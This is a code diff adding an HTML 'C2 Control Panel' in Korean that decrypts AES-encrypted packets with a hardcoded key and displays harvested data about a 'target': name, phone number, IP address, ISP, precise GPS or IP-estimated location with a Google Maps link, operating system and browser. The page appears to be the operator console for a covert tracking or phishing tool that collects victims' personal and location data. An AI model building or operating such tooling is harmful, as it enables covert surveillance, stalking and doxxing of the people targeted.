@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Control Panel - Packet Decryptor v1.7</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; line-height: 1.4; }
+        .container { max-width: 850px; margin: auto; border: 1px solid #0f0; padding: 25px; box-shadow: 0 0 25px rgba(0,255,0,0.3); }
+        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; text-align: center; color: #0f0; }
+        textarea { width: 100%; height: 120px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; box-sizing: border-box; font-size: 12px; outline: none; margin-bottom: 10px; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; }
+        button:hover { background: #0c0; transform: scale(1.01); }
+        #result { margin-top: 25px; white-space: pre-wrap; color: #ffff00; border-top: 1px dashed #0f0; padding-top: 20px; font-size: 14px; }
+        .map-link { color: #00ffff; font-weight: bold; text-decoration: none; border: 1px solid #00ffff; padding: 3px 10px; border-radius: 4px; display: inline-block; margin-top: 5px; }
+        .map-link:hover { background: #00ffff; color: #000; }
+        .warning { color: #ff3e3e; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>[ SYSTEM RECON : DATA DECRYPTOR ]</h1>
+        <p style="color: #888;">> 전송된 Encrypted Payload를 입력하십시오...</p>
+        <textarea id="cipherInput" placeholder="암호문을 붙여넣으세요 (U2FsdGVkX19...)"></textarea>
+        <button onclick="decryptPacket()">DECRYPT AND RECONNAISSANCE</button>
+        <div id="result">해독 대기 중... 시스템 준비 완료.</div>
+    </div>
+
+    <script>
+        function decryptPacket() {
+            const cipherText = document.getElementById('cipherInput').value.trim();
+            const SECRET_KEY = "0x7E6_RECON_System_!@#_Secure_2026_AES";
+
+            try {
+                const bytes = CryptoJS.AES.decrypt(cipherText, SECRET_KEY);
+                const decryptedData = bytes.toString(CryptoJS.enc.Utf8);
+
+                if (!decryptedData) throw new Error("Invalid Key");
+
+                const obj = JSON.parse(decryptedData);
+                
+                let output = "🔓 <span style='color:#0f0;'>=== [DECRYPTION SUCCESSFUL] ===</span>\n\n";
+                output += `📅 <b>수집 시간</b>  : ${obj.timestamp}\n`;
+                output += `👤 <b>타겟 이름</b>  : ${obj.name}\n`;
+                output += `📱 <b>연락처</b>    : ${obj.phone}\n`;
+                output += `🌐 <b>IP 주소</b>    : ${obj.ip}\n`;
+                output += `🏢 <b>통신사(ISP)</b>: ${obj.isp}\n`;
+                
+                // 위치 정보 로직
+                let isGPS = !isNaN(obj.lat) && !String(obj.lat).includes("IP");
+                let locStatus = isGPS ? "<span style='color:#0f0;'>[GPS 정밀수집]</span>" : "<span class='warning'>[IP 기반 추정] (권한거부 대비)</span>";
+                
+                output += `📍 <b>위치 정보</b>  : ${obj.lat}, ${obj.lon} ${locStatus}\n`;
+
+                if (obj.lat && obj.lon) {
+                    const mapUrl = `https://www.google.com/maps?q=${obj.lat},${obj.lon}`;
+                    output += `🗺️ <b>구글 지도</b>  : <a href="${mapUrl}" target="_blank" class="map-link">지도에서 타겟 확인</a>\n`;
+                }
+
+                output += `\n💻 <b>OS/기기</b>   : ${obj.os}\n`;
+                output += `🧭 <b>브라우저</b>  : ${obj.browser}\n`;
+                
+                document.getElementById('result').innerHTML = output;
+
+            } catch (e) {
+                document.getElementById('result').innerHTML = "<span class='warning'>❌ 해독 실패: 암호문이 부정확하거나 키가 일치하지 않습니다.</span>";
+            }
+        }
+    </script>
+</body>
+</html>
